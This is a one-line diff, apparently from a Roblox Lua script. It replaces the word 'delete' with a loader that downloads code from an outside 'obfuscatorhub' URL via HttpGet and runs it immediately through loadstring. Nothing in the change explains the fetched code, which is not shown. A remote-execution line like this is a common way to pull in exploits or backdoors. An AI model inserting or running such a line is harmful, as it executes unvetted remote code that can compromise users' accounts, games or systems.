@@ -1,1 +1,1 @@
-delete
+loadstring(game:HttpGet("https://obfuscatorhub.lol/api/NNx_L7NT"))()
